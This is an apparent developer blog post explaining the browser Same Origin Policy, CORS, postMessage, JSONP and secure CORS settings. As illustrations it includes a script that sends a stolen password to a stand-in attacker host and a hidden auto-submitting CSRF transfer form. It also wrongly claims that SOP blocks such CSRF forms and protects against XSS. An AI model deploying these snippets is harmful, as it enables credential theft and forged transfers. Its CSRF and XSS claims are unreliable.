---
title: "Same Origin Policy (SOP) - The Foundation of Web Application Security"
description: "Learn about Same Origin Policy, its importance for security, and how to handle cross-origin limitations"
pubDate: "Mar 16 2025"
heroImage: "/mc-blog/same-origin-policy.svg"
---

**TLDR:**

<div class="tldr">

**Same Origin Policy (SOP)** is a fundamental security mechanism in browsers that:

1. **Defines "origin"** as a combination of protocol, domain, and port

   - Different protocols (http vs https) = different origin
   - Different domains (example.com vs api.example.com) = different origin
   - Different ports (80 vs 8080) = different origin

2. **Restricts interactions** between resources from different origins:

   - Blocks access to DOM of other pages
   - Limits access to data in Local/Session Storage
   - Blocks reading responses from AJAX/fetch requests

3. **Provides isolation** between different pages and applications:

   - Protects against data theft
   - Prevents CSRF attacks
   - Isolates JavaScript execution contexts

4. **Requires special mechanisms** for cross-origin communication:
   - CORS (Cross-Origin Resource Sharing)
   - postMessage API
   - JSONP (older technique)

</div>

## Introduction to Same Origin Policy

Same Origin Policy (SOP) is one of the most important security mechanisms in web browsers. It was introduced by Netscape in 1995 as a response to growing threats related to interactions between different websites.

SOP is the foundation of web application security, preventing unauthorized access to data and resources between different domains. Without this policy, malicious websites could easily steal data from other sites, including users' confidential information.

## What is "Origin"?

"Origin" is a key concept in Same Origin Policy. Origin is defined as a combination of three elements:

1. **Protocol** (scheme) - e.g., http, https, ftp
2. **Domain** (hostname) - e.g., example.com, api.example.com
3. **Port** - e.g., 80, 443, 8080

Two resources are considered to be from the same origin only when all three elements are identical.

### Examples of different origins

| URL                      | Origin                   | Same origin as https://example.com? |
| ------------------------ | ------------------------ | ----------------------------------- |
| https://example.com      | https://example.com      | Yes                                 |
| https://example.com:443  | https://example.com      | Yes (port 443 is default for HTTPS) |
| http://example.com       | http://example.com       | No (different protocol)             |
| https://api.example.com  | https://api.example.com  | No (different domain)               |
| https://example.com:8080 | https://example.com:8080 | No (different port)                 |

### Special cases

- **Subdomains**: api.example.com and example.com are considered different origins, even though they are part of the same main domain.
- **IP vs domain**: 192.168.1.1 and example.com pointing to the same server are considered different origins.
- **Default ports**: If the port is not specified, the browser uses default ports (80 for HTTP, 443 for HTTPS).

## How does Same Origin Policy work?

Same Origin Policy restricts interactions between resources from different origins in several key areas:

### 1. DOM Access

JavaScript running on one page cannot access the DOM of another page if they come from different origins.

```javascript
// Attempt to access an iframe from a different origin
const iframe = document.getElementById("external-frame");
try {
  // This will fail if the iframe is from a different origin
  const iframeDocument = iframe.contentDocument;
  console.log(iframeDocument.body.innerHTML);
} catch (e) {
  console.error("No access to iframe from different origin:", e);
}
```

### 2. Access to Local/Session Storage data

Data stored in Local Storage or Session Storage is only accessible to scripts from the same origin.

```javascript
// Attempt to access Local Storage from a different origin
try {
  // This will fail if the script is from a different origin
  const data = localStorage.getItem("userData");
  console.log(data);
} catch (e) {
  console.error("No access to Local Storage from different origin:", e);
}
```

### 3. AJAX/fetch requests

By default, AJAX or fetch requests to a different origin are blocked by the browser.

```javascript
// Attempt to make a request to a different origin
fetch("https://api.example.com/data")
  .then((response) => response.json())
  .then((data) => console.log(data))
  .catch((error) => console.error("Cross-origin request error:", error));
// This request will be blocked unless the server supports CORS
```

### 4. Reading content of images, canvas, and other resources

JavaScript cannot read the content of images, canvas, or other resources from a different origin.

```javascript
// Attempt to read data from an image from a different origin
const img = new Image();
img.crossOrigin = "anonymous"; // Attempt to enable CORS for the image
img.onload = function () {
  const canvas = document.createElement("canvas");
  canvas.width = img.width;
  canvas.height = img.height;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(img, 0, 0);
  // This may fail if the server doesn't support CORS for images
  const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
  console.log(imageData);
};
img.src = "https://example.com/image.jpg";
```

## Why is Same Origin Policy important?

Same Origin Policy is a key security mechanism for several reasons:

### 1. Protection against data theft

Without SOP, a malicious site could load another site in an iframe and steal sensitive data such as passwords, session tokens, or financial information.

```html
<!-- A malicious site without SOP could do something like this -->
<iframe src="https://bank.com" id="bank-frame"></iframe>
<script>
  // Without SOP, this would work and steal user data
  const bankFrame = document.getElementById("bank-frame");
  const bankDocument = bankFrame.contentDocument;
  const password = bankDocument.getElementById("password").value;
  // Sending the password to the attacker's server
  fetch("https://attacker.com/steal", {
    method: "POST",
    body: JSON.stringify({ password }),
  });
</script>
```

### 2. Prevention of CSRF attacks

Same Origin Policy helps prevent Cross-Site Request Forgery (CSRF) attacks, which involve executing unauthorized requests on behalf of a logged-in user.

```html
<!-- A malicious site without SOP could do something like this -->
<form
  id="csrf-form"
  action="https://bank.com/transfer"
  method="POST"
  style="display:none;"
>
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="1000" />
</form>
<script>
  // Without SOP, this would work and execute the transfer without user knowledge
  document.getElementById("csrf-form").submit();
</script>
```

### 3. Isolation of JavaScript execution contexts

SOP provides isolation between different JavaScript execution contexts, preventing interference between scripts from different sources.

## Exceptions and workarounds for Same Origin Policy

Although Same Origin Policy is a key security mechanism, there are situations where communication between different origins is desired or even necessary. In such cases, there are special mechanisms that allow for secure cross-origin communication.

### 1. Cross-Origin Resource Sharing (CORS)

CORS is a mechanism that allows servers to specify which origins can access their resources.

#### Server-side (Node.js/Express example)

```javascript
const express = require("express");
const app = express();

// Enabling CORS for a specific origin
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "https://trusted-site.com");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type, Authorization");
  next();
});

// Handling OPTIONS requests (preflight)
app.options("/api/data", (req, res) => {
  res.status(200).end();
});

app.get("/api/data", (req, res) => {
  res.json({ data: "Sensitive data from API" });
});

app.listen(3000, () => {
  console.log("Server running on port 3000");
});
```

#### Client-side

```javascript
// Request with CORS support
fetch("https://api.example.com/data", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    Authorization: "Bearer token123",
  },
  body: JSON.stringify({ query: "data" }),
})
  .then((response) => response.json())
  .then((data) => console.log(data))
  .catch((error) => console.error("Error:", error));
```

### 2. postMessage API

postMessage API allows for secure communication between windows, iframe frames, or browser tabs, even if they come from different origins.

#### Sending messages

```javascript
// In the parent window
const iframe = document.getElementById("child-frame");
iframe.contentWindow.postMessage(
  "Hello from parent!",
  "https://child-site.com"
);

// In the iframe
window.addEventListener("message", function (event) {
  // Checking the sender's origin
  if (event.origin !== "https://parent-site.com") return;

  console.log("Received message:", event.data);
  // Response
  event.source.postMessage("Hello from child!", event.origin);
});
```

### 3. JSONP (JSON with Padding)

JSONP is an older technique that allows for cross-origin requests by dynamically adding `<script>` tags.

```javascript
function jsonp(url, callback) {
  const script = document.createElement("script");
  const callbackName = "jsonp_" + Math.round(Math.random() * 1000000);
  window[callbackName] = function (data) {
    callback(data);
    document.body.removeChild(script);
    delete window[callbackName];
  };
  script.src =
    url + (url.includes("?") ? "&" : "?") + "callback=" + callbackName;
  document.body.appendChild(script);
}

// Usage
jsonp("https://api.example.com/data?param=value", function (data) {
  console.log("Received data:", data);
});
```

### 4. WebSockets

WebSockets are not restricted by Same Origin Policy, but the server can implement its own authorization mechanisms.

```javascript
const socket = new WebSocket("wss://api.example.com/socket");

socket.onopen = function () {
  console.log("Connection established");
  socket.send("Hello server!");
};

socket.onmessage = function (event) {
  console.log("Received message:", event.data);
};

socket.onerror = function (error) {
  console.error("WebSocket error:", error);
};

socket.onclose = function () {
  console.log("Connection closed");
};
```

## Secure CORS configuration

Proper CORS configuration is crucial for application security. Here are some best practices:

### 1. Limiting allowed origins

Always limit `Access-Control-Allow-Origin` to specific, trusted domains, avoid using `*`.

```javascript
// Good - specific domain
res.header("Access-Control-Allow-Origin", "https://trusted-site.com");

// Bad - all domains
res.header("Access-Control-Allow-Origin", "*");
```

### 2. Limiting allowed methods

Specify only the HTTP methods that are actually needed.

```javascript
// Good - only needed methods
res.header("Access-Control-Allow-Methods", "GET, POST");

// Bad - all methods
res.header("Access-Control-Allow-Methods", "*");
```

### 3. Limiting allowed headers

Specify only the headers that are actually used.

```javascript
// Good - only needed headers
res.header("Access-Control-Allow-Headers", "Content-Type, Authorization");

// Bad - all headers
res.header("Access-Control-Allow-Headers", "*");
```

### 4. Handling credentials

If you need to send credentials (cookies, authorization headers), you must explicitly enable them.

```javascript
// Server-side
res.header("Access-Control-Allow-Credentials", "true");

// Client-side
fetch("https://api.example.com/data", {
  credentials: "include", // or 'same-origin'
});
```

## Same Origin Policy in modern web applications

In modern web applications, which often consist of multiple microservices and APIs, Same Origin Policy can pose challenges. Here are some approaches to dealing with these challenges:

### 1. API Gateway architecture

Instead of allowing direct access to multiple microservices, use an API gateway that will be the single entry point for clients.

```
Client -> API Gateway -> Microservices
```

### 2. Proxy servers

You can use a proxy server that will forward requests to different origins, hiding origin differences from the client.

```javascript
// Example proxy configuration in Express
const { createProxyMiddleware } = require("http-proxy-middleware");

app.use(
  "/api",
  createProxyMiddleware({
    target: "https://api.example.com",
    changeOrigin: true,
    pathRewrite: {
      "^/api": "",
    },
  })
);
```

### 3. JWT (JSON Web Tokens)

Use JWT for cross-origin request authorization, which eliminates the need to share cookies between domains.

```javascript
// Example of using JWT in a request
fetch("https://api.example.com/data", {
  headers: {
    Authorization: "Bearer " + jwtToken,
  },
});
```

## Summary

Same Origin Policy is a fundamental security mechanism in web browsers that prevents unauthorized access to data and resources between different domains. It is a key element in protection against attacks such as XSS and CSRF.

Although SOP can pose challenges in modern web applications, there are secure mechanisms such as CORS, postMessage API, and proxy servers that allow for cross-origin communication without violating security principles.

Understanding Same Origin Policy and its implications is essential for every web application developer to create secure and reliable applications.
